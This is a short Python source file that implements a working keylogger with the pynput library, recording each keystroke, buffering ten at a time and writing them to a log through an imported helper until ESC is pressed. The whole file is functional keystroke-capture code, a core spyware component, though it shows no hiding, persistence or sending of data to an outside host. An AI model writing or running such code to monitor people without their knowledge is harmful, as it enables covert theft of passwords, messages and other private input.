from pynput import keyboard
from logger.file_writer import write_log

# This list will hold keystrokes before saving
keys_buffer = []

def on_press(key):
    try:
        keys_buffer.append(key.char)  # Normal keys
    except AttributeError:
        keys_buffer.append(f"[{key}]")  # Special keys like Enter, Shift

    if len(keys_buffer) >= 10:  # Save after 10 keystrokes
        save_keys()

def save_keys():
    if keys_buffer:
        text = "".join(str(k) for k in keys_buffer)
        write_log(text)
        keys_buffer.clear()

def on_release(key):
    if key == keyboard.Key.esc:  # Stop if ESC pressed
        save_keys()
        return False

def start_keylogger():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()